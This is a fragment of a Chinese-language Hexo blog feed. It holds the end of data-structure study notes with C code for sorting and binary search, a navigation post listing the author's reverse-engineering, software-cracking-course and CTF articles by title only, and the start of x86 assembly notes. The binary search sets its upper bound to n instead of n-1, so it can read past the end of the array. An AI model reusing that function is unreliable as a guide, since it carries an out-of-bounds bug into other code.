class="line">            ++low;</span><br><span class="line">        a[high] = a[low];</span><br><span class="line">    &#125; <span class="comment">//终止while循环之后low和high一定是相等的</span></span><br><span class="line"></span><br><span class="line">    a[low] = val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high; <span class="comment">//high可以改为low，但不能改为val 也不能改为a[low] 也不能改为a[high]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-5-归并排序"><a href="#4-5-归并排序" class="headerlink" title="4.5 归并排序"></a>4.5 归并排序</h2><p>归并排序是建立在归并操作上的一种有效、稳定的排序算法，该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为二路归并。</p><img src="/posts/79666db/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F.png" class="" title="归并排序"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">Merge</span><span class="params">(<span class="type">int</span> sourceArr[],<span class="type">int</span> tempArr[], <span class="type">int</span> startIndex, <span class="type">int</span> midIndex, <span class="type">int</span> endIndex)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = startIndex, j=midIndex+<span class="number">1</span>, k = startIndex;</span><br><span class="line">    <span class="keyword">while</span>(i!=midIndex+<span class="number">1</span> &amp;&amp; j!=endIndex+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(sourceArr[i] &gt; sourceArr[j])</span><br><span class="line">            tempArr[k++] = sourceArr[j++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tempArr[k++] = sourceArr[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i != midIndex+<span class="number">1</span>)</span><br><span class="line">        tempArr[k++] = sourceArr[i++];</span><br><span class="line">    <span class="keyword">while</span>(j != endIndex+<span class="number">1</span>)</span><br><span class="line">        tempArr[k++] = sourceArr[j++];</span><br><span class="line">    <span class="keyword">for</span>(i=startIndex; i&lt;=endIndex; i++)</span><br><span class="line">        sourceArr[i] = tempArr[i];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//内部使用递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MergeSort</span><span class="params">(<span class="type">int</span> sourceArr[], <span class="type">int</span> tempArr[], <span class="type">int</span> startIndex, <span class="type">int</span> endIndex)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> midIndex;</span><br><span class="line">    <span class="keyword">if</span>(startIndex &lt; endIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        midIndex = startIndex + (endIndex-startIndex) / <span class="number">2</span>;<span class="comment">//避免溢出int</span></span><br><span class="line">        MergeSort(sourceArr, tempArr, startIndex, midIndex);</span><br><span class="line">        MergeSort(sourceArr, tempArr, midIndex+<span class="number">1</span>, endIndex);</span><br><span class="line">        Merge(sourceArr, tempArr, startIndex, midIndex, endIndex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">8</span>] = &#123;<span class="number">50</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">70</span>, <span class="number">40</span>, <span class="number">80</span>, <span class="number">60</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i, b[<span class="number">8</span>];</span><br><span class="line">    MergeSort(a, b, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-6-折半查找"><a href="#4-6-折半查找" class="headerlink" title="4.6 折半查找"></a>4.6 折半查找</h2><p>折半查找的基本思想是：在有序表中，取中间记录作为比较对象，若给定值与中间记录的关键字相等，则查找成功；若给定值小于中间记录的关键字，则在中间记录的左半区继续查找；若给定值大于中间记录的关键字，则在中间记录的右半区继续查找。不断重复上述过程，直到查找成功或所有查找区域无记录，查找失败。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//折半查找,又称为二分查找,条件保证要升序排序</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Binary_Search</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> n,<span class="type">int</span> key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> low,high,mid;</span><br><span class="line">    low = <span class="number">0</span>;    <span class="comment">//定义最低下标为记录首位</span></span><br><span class="line">    high = n;   <span class="comment">//记录最高下标为记录末位</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( low &lt;= high )</span><br><span class="line">    &#123;</span><br><span class="line">        mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; a[mid]) &#123;</span><br><span class="line">            high = mid - <span class="number">1</span>;<span class="comment">//最高位下标调小 一位</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(key &gt; a[mid])&#123;</span><br><span class="line">            low = mid + <span class="number">1</span>; <span class="comment">//最低下标调整到中位下标大一位</span></span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> mid; <span class="comment">//代表就是次位置</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">//没有找到返回-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//需求要查找8, 如果用传统的方式 要查找8次才能得出</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    index = Binary_Search(a, <span class="keyword">sizeof</span>(a) / <span class="keyword">sizeof</span>(<span class="type">int</span>),<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;没有找到！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;找到了,index为:%d\n&quot;</span>,index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;呜呜呜笔试的痛，基础一定要打好啊！要不然就像我一样要把知识重新捡回来了。我大一学数据结构就是跟着郝斌老师学的，非常nice！&lt;a href=&quot;https://www.bilibili.com/video/BV11s41167h6?p=1&quot;&gt;【郝斌】数据结构入门&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;记笔记记到一半上来感慨一下，绝了姐妹们！温故而知新，我把之前学的知识串通起来了！&lt;/p&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://example.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>README</title>
    <link href="http://example.com/posts/77cd4175.html"/>
    <id>http://example.com/posts/77cd4175.html</id>
    <published>2022-04-11T05:27:33.039Z</published>
    <updated>2022-04-16T00:46:41.314Z</updated>
    
    <content type="html"><![CDATA[<p>由于之前手贱把整个博客给删了，导致现在这个博客里的文章排序非常混乱，本强迫症患者实在有点看不下去，用hexo的文章置顶插件也不太理想，所以干脆用此做个导航贴。</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><ul><li><a href="https://v5le0n9.github.io/posts/79666db.html">数据结构</a></li><li><a href="https://v5le0n9.github.io/posts/d04bd5bc.html">操作系统</a></li></ul><h1 id="Windows逆向"><a href="#Windows逆向" class="headerlink" title="Windows逆向"></a>Windows逆向</h1><ul><li><a href="https://v5le0n9.github.io/posts/de6e58e0.html">x86汇编基础</a></li><li><a href="https://v5le0n9.github.io/posts/33a085c7.html">OD使用教程</a></li><li><a href="https://v5le0n9.github.io/posts/e2d652c5.html">吾爱破解培训第一课——脱壳基础</a></li><li><a href="https://v5le0n9.github.io/posts/7cd35487.html">吾爱破解培训第二三课——去弹窗、主页锁定及DIY</a></li><li><a href="https://v5le0n9.github.io/posts/65ab04eb.html">吾爱破解培训第四课——去程序自校验</a></li><li><a href="https://v5le0n9.github.io/posts/bb44dc0.html">吾爱破解培训第五六课——解除程序重启验证，程序打补丁</a></li><li><a href="https://v5le0n9.github.io/posts/a4cc5112.html">吾爱破解培训第七课——常见的网络验证</a></li><li><a href="https://v5le0n9.github.io/posts/4b9d65e0.html">吾爱破解培训第八九课——深入浅出探讨脱壳细节</a></li><li><a href="https://v5le0n9.github.io/posts/efe98763.html">吾爱破解培训第十课——x64平台脱壳与破解实战</a></li><li><a href="https://v5le0n9.github.io/posts/f398dcca.html">吾爱破解学习指导教程</a></li><li><a href="https://v5le0n9.github.io/posts/784f7e1d.html">.Net逆向教程</a></li><li>一些刷题记录：<ul><li><a href="https://v5le0n9.github.io/posts/5a99a36.html">攻防世界 逆向高手进阶区</a></li><li><a href="https://v5le0n9.github.io/posts/5ada4708.html">吾爱破解2022春节——Windows中级题</a></li><li><a href="https://v5le0n9.github.io/posts/f4e89fa4.html">BUUCTF 逆向合集</a></li></ul></li></ul><h1 id="Android逆向"><a href="#Android逆向" class="headerlink" title="Android逆向"></a>Android逆向</h1><ul><li><a href="https://v5le0n9.github.io/posts/6d8340c1.html">ARM汇编语言</a></li><li><a href="https://v5le0n9.github.io/posts/15be101a.html">Android逆向入门教程</a></li><li>一些刷题记录：<ul><li><a href="https://v5le0n9.github.io/posts/9f62af2.html">攻防世界 Android逆向合集</a></li><li><a href="https://v5le0n9.github.io/posts/8b4ac9a8.html">吾爱破解2022春节——Android中级题</a></li><li><a href="https://v5le0n9.github.io/posts/17c1c819.html">Bugku Android逆向合集</a></li></ul></li></ul><h1 id="高级语言"><a href="#高级语言" class="headerlink" title="高级语言"></a>高级语言</h1><ul><li><a href="https://v5le0n9.github.io/posts/8df0ec14.html">Java学习</a></li><li><a href="https://v5le0n9.github.io/posts/e39e2a4e.html">Python学习</a></li></ul><h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul><li><a href="https://v5le0n9.github.io/posts/2670ba0d.html">感知机学习算法</a></li><li><a href="https://v5le0n9.github.io/posts/e955b133.html">k-近邻算法</a></li></ul><h1 id="密码算法"><a href="#密码算法" class="headerlink" title="密码算法"></a>密码算法</h1><ul><li><a href="https://v5le0n9.github.io/posts/855b12c4.html">RSA算法</a></li><li><a href="https://v5le0n9.github.io/posts/6b338c34.html">Base系列算法</a></li></ul><h1 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h1><ul><li><a href="https://v5le0n9.github.io/posts/54924480.html">Web渗透</a></li><li>一些小游戏：<ul><li><a href="https://v5le0n9.github.io/posts/9589547b.html">黑客丛林之旅小游戏</a></li><li><a href="https://v5le0n9.github.io/posts/76c5464c.html">monyer闯关小游戏</a></li></ul></li></ul><h1 id="二进制安全"><a href="#二进制安全" class="headerlink" title="二进制安全"></a>二进制安全</h1><ul><li><a href="https://v5le0n9.github.io/posts/1c971db4.html">pwn基础入门</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;由于之前手贱把整个博客给删了，导致现在这个博客里的文章排序非常混乱，本强迫症患者实在有点看不下去，用hexo的文章置顶插件也不太理想，所以干脆用此做个导航贴。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>x86汇编基础</title>
    <link href="http://example.com/posts/de6e58e0.html"/>
    <id>http://example.com/posts/de6e58e0.html</id>
    <published>2022-04-11T05:16:29.411Z</published>
    <updated>2022-04-11T05:43:13.844Z</updated>
    
    <content type="html"><![CDATA[<p>很久之前看王爽老师的《汇编语言》写的笔记，可能不太准确，先做个存档吧。</p><span id="more"></span><h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h1><p>汇编指令是机器指令的助记符，同机器指令一一对应。</p><p>每一种CPU都有自己的汇编指令集。</p><p>CPU可以直接使用的信息在存储器中存放。</p><p>指令和数据没有任何区别，都是二进制信息。</p><p>存储单元从零开始顺序编号。</p><p>存储器的存储单元可以存储1B，即8个二进制位。微机存储器的容量是以<strong>字节</strong>为最小单位来计算的。</p><p>1B=8b, 1KB=1024B, 1MB=1024KB, 1GB=1024MB, 1TB=1024GB</p><p>地址总线：</p><ul><li>CPU是通过地址总线来指定存储单元的</li><li>地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址</li><li>一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N，这样的CPU最多可以寻找2的N次方个内存单元(B)</li></ul><p>数据总线：</p><ul><li>CPU与内存或其他器件之间的数据传送是通过数据总线来进行的</li><li>数据总线的宽度决定了CPU和外界的数据传送速度，8根数据总线一次可传送一个8位二进制数据(即1B)</li></ul><p>控制总线：</p><ul><li>CPU对外部器件的控制是通过控制总线来进行的</li><li>有多少根控制总线就意味着CPU提供了对外部器件的多少种控制</li><li>控制总线的宽度决定了CPU对外部器件的控制能力</li></ul><h1 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2. 寄存器"></a>2. 寄存器</h1><p>内部总线实现CPU内部各个器件之间的连接，外部总线实现CPU和主板上其他器件的联系。</p><h2 id="2-1-通用寄存器"><a href="#2-1-通用寄存器" class="headerlink" title="2.1 通用寄存器"></a>2.1 通用寄存器</h2><p>AX, BX, CX, DX</p><p>以AX为例，数据18，二进制表示10010，小端序</p><div class="table-container"><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th>AX</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td></tr><tr><td></td><td></td><td>8~15</td><td>AH</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>0~7</td><td>AL</td><td></td><td></td></tr></tbody></table></div><p>AH和AL可以看成是一个字型数据的高8位和低8位，也可以看成是两个独立的字节型数据。</p><h2 id="2-2-几条汇编指令"><a href="#2-2-几条汇编指令" class="headerlink" title="2.2 几条汇编指令"></a>2.2 几条汇编指令</h2><img src="/posts/de6e58e0/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E4%B8%BE%E4%BE%8B.png" class="" title="汇编指令举例"><p>汇编指令不区分大小写。</p><p>原AX=0000H，BX=0000H</p><div class="table-container"><table><thead><tr><th>程序段中的指令</th><th>指令执行后AX中的数据</th><th>指令执行后BX中的数据</th></tr></thead><tbody><tr><td>mov ax, 4E20H</td><td>4E20H</td><td>0000H</td></tr><tr><td>add ax, 1406H</td><td>6226H</td><td>0000H</td></tr><tr><td>mov bx, 2000H</td><td>6226H</td><td>2000H</td></tr><tr><td>add ax, bx</td><td>8226H</td><td>2000H</td></tr><tr><td>mov bx, ax</td><td>8226H</td><td>8226H</td></tr><tr><td>add ax, bx</td><td><strong>044CH</strong></td><td>8226H</td></tr></tbody></table></div><h2 id="2-3-物理地址"><a href="#2-3-物理地址" class="headerlink" title="2.3 物理地址"></a>2.3 物理地址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">物理地址=段地址×16+偏移地址=基础地址+偏移地址</span><br></pre></td></tr></table></figure><p>CPU可以用不同的段地址和偏移地址形成同一个物理地址。</p><p>偏移地址16位，变化范围0~FFFFH，仅用偏移地址来寻址最多可寻$2^{16}B=2^{6}KB=64KB$个内存单元。</p><h2 id="2-4-CS-和-IP"><a href="#2-4-CS-和-IP" class="headerlink" title="2.4 CS 和 IP"></a>2.4 CS 和 IP</h2><p>CS为代码段寄存器(存放段地址)，IP为指令指针寄存器(存放偏移地址)。</p><p>同时修改CS、IP的内容：jmp 段地址：偏移地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 3:0B16执行后：CS=0003H,IP=0B16H,CPU将从00030H+0B16H=00B46H处读取指令</span><br></pre></td></tr></table></figure><p>仅修改IP的内容：jmp 某一合法寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmp ax执行指令前：ax=1000H,CS=2000H,IP=0003H</span><br><span class="line">执行指令后：ax=1000H,CS=2000H,IP=1000H</span><br></pre></td></tr></table></figure><p>8086CPU工作过程：</p><ol><li>从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器</li><li>IP指向下一条指令</li><li>执行指令（转到1，重复）</li></ol><h1 id="3-内存访问"><a href="#3-内存访问" class="headerlink" title="3. 内存访问"></a>3. 内存访问</h1><p>字单元：存放一个字型数据(16位)的内存单元，由两个地址连续的内存单元组成。高地址内存单元中存放字型数据的高位字节，低地址内存单元中存放字型数据的低位字节。</p><p>起始地址为N的字单元简称为N地址字单元。比如一个字单元由2、3两个内存单元组成，则这个字单元的起始地址为2。</p><h2 id="3-1-DS-和-address"><a href="#3-1-DS-和-address" class="headerlink" title="3.1 DS 和 [address]"></a>3.1 DS 和 [address]</h2><p>DS为数据段寄存器(存放段地址)，[address]表示一个内存单元(存放偏移地址)。</p><h2 id="3-2-mov指令-add、sub指令同"><a href="#3-2-mov指令-add、sub指令同" class="headerlink" title="3.2 mov指令(add、sub指令同)"></a>3.2 mov指令(add、sub指令同)</h2><ol><li>将数据直接送入寄存器：mov 寄存器，数据</li><li><p>将一个寄存器中的内容送人另一个寄存器：mov 寄存器，寄存器</p></li><li><p>将一个内存单元中的内容送入一个寄存器中：mov 寄存器，内存单元地址</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将10000H(1000:0)中的数据读到al中:</span><br><span class="line">mov bx, 1000H</span><br><span class="line">mov ds, bx</span><br><span class="line">mov al, [0]</span><br></pre></td></tr></table></figure><ol><li>mov 内存单元，寄存器</li><li>mov 段寄存器，寄存器</li></ol><p>8086CPU不支持将数据直接送入段寄存器的操作，ds是一个段寄存器，所以<code>mov ds,1000H</code>这条指令是非法的，只好用一个寄存器来进行中转，即先将1000H送入一个通用寄存器，再将通用寄存器的内容送入ds。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将al中的数据送入内存单元10000H中:</span><br><span class="line">mov bx, 1000H</span><br><span class="line">mov ds, bx</span><br><span class="line">mov [0], al</span><br></pre></td></tr></table></figure><h2 id="3-3-CPU提供的栈机制"><a href="#3-3-CPU提供的栈机制" class="headerlink" title="3.3 CPU提供的栈机制"></a>3.3 CPU提供的栈机制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ax 表示将寄存器ax中的数据送入栈中</span><br><span class="line">pop ax 表示从栈顶取出数据送入ax</span><br></pre></td></tr></table></figure><p>8086CPU的入栈和出栈操作都是以字为单位进行的。</p><p>CPU如何知道栈顶位置？SS:SP，任意时刻，SS:SP指向栈顶元素。</p><p>push ax由以下两步完成：</p><ol><li>SP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶</li><li>将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶</li></ol><p>pop ax由以下两步完成：</p><ol><li>将SS:SP指向的内存单元处的数据送入ax中</li><li>SP=SP+2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶</li></ol><h2 id="3-4-push指令-pop指令同"><a href="#3-4-push指令-pop指令同" class="headerlink" title="3.4 push指令(pop指令同)"></a>3.4 push指令(pop指令同)</h2><ol><li>将一个寄存器中的数据入栈：push 寄存器</li><li>将一个段寄存器中的数据入栈：push 段寄存器</li><li>将一个内存字单元处的字入栈：push 内存单元</li></ol><p>指令执行时，CPU要知道内存单元的地址，可以在push、pop指令中只给出内存单元的偏移地址，段地址在指令执行时，CPU从DS中取得。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">push [0];将1000:0处的字压入栈</span><br><span class="line">pop [2];出栈的数据送入1000:2处</span><br></pre></td></tr></table></figure><p>将10000H~1000FH这段空间当作栈，初始状态栈是空的，将ax, bx, DS中的数据入栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ss,ax;设置栈的段地址</span><br><span class="line">mov sp,0010H;设置栈的偏移地址,因栈为空,所以sp=000FH+0002H=0010H</span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">push ds</span><br></pre></td></tr></table></figure><p>push、pop等栈操作指令，修改的只是SP。也就是说，栈顶的变化范围最大为0~FFFFH</p><p>一个栈段的容量最大为64KB。</p><p>在10000H处写入字型数据2266H</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,2266H</span><br><span class="line">mov [0],ax</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">mov ax,1000H</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,2</span><br><span class="line">mov ax,2266H</span><br><span class="line">push ax</span><br></pre></td></tr></table></figure><h2 id="3-5-段的综述"><a href="#3-5-段的综述" class="headerlink" title="3.5 段的综述"></a>3.5 段的综述</h2><p>对于数据段，将它的段地址放在DS中，用mov、add、sub等访问内存单元的指令时，CPU就将我们定义的数据段中的内容当作数据来访问。</p><p>对于代码段，将它的段地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就将执行我们定义的代码中的指令。</p><p>对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地址放在SP中，这样CPU在需要进行栈操作的时候，比如执行push、pop指令等，就将我们定义的栈段当作栈空间来用。</p><p>CPU将内存中的某段内容当作代码，是因CS:IP指向了那里；CPU将某段内存当作栈，是因为SS:SP指向了那里。</p><h1 id="4-第一个程序"><a href="#4-第一个程序" class="headerlink" title="4. 第一个程序"></a>4. 第一个程序</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">mov ax,0123H</span><br><span class="line">mov bx,0456H</span><br><span class="line">add ax,bx</span><br><span class="line">add ax,ax</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>在汇编语言程序中包含两种指令：伪指令、汇编指令。汇编指令是有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。伪指令没有对应的机器指令，最终不被CPU执行。伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作。</p><h2 id="4-1-伪指令"><a href="#4-1-伪指令" class="headerlink" title="4.1 伪指令"></a>4.1 伪指令</h2><h3 id="4-1-1-XXX-segment-……-XXX-ends"><a href="#4-1-1-XXX-segment-……-XXX-ends" class="headerlink" title="4.1.1 XXX segment …… XXX ends"></a>4.1.1 XXX segment …… XXX ends</h3><p>segment和ends的功能是定义一个段，segment说明一个段开始，ends说明一个段结束。</p><p>一个有意义的汇编程序中至少要有一个段，这个段用来存放代码。</p><h3 id="4-1-2-end"><a href="#4-1-2-end" class="headerlink" title="4.1.2 end"></a>4.1.2 end</h3><p>end是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，如果碰到了伪指令end，就结束对源程序的编译。</p><h3 id="4-1-3-assume"><a href="#4-1-3-assume" class="headerlink" title="4.1.3 assume"></a>4.1.3 assume</h3><p>这条伪指令的含义为“假设”，它假设某一段寄存器和程序中的某一个用segment…ends定义的段相关联。通过assume说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系。</p><h2 id="4-2-汇编指令"><a href="#4-2-汇编指令" class="headerlink" title="4.2 汇编指令"></a>4.2 汇编指令</h2><h2 id="4-3-标号"><a href="#4-3-标号" class="headerlink" title="4.3 标号"></a>4.3 标号</h2><p>一个标号指代了一个地址，比如“codesg”。codesg在segment前面，作为一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址。</p><h2 id="4-4-程序的结构"><a href="#4-4-程序的结构" class="headerlink" title="4.4 程序的结构"></a>4.4 程序的结构</h2><p>编程运算$2^3$</p><ol><li>定义一个段，名称为abc</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure><ol><li>在这个段中写入汇编指令，来实现我们的任务</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">abc 